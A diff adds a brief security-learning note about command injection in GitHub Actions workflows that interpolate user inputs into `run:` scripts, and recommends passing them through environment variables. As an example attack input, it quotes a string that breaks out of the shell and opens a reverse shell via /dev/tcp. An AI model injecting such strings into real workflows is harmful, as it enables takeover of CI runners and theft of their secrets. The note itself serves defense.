@@ -1,0 +1,4 @@
+## 2024-05-18 - Fix Command Injection via GitHub Actions Context
+**Vulnerability:** Command injection in GitHub Actions workflows where user-controlled inputs (like `${{github.event.inputs.formula}}`) were directly interpolated into bash shell scripts using the `run:` directive. This allows an attacker to break out of the string context and run arbitrary code by providing inputs like `"; bash -i >& /dev/tcp/...`.
+**Learning:** Directly interpolating `${{ ... }}` blocks inside a `run:` string causes the Actions runner to treat the whole substituted string as bash script before execution. This makes it vulnerable if the inputs are not strictly sanitized.
+**Prevention:** Always pass user inputs into shell scripts using environment variables (in an `env:` block) and reference those environment variables within the bash script, rather than interpolating context values directly into the shell snippet.
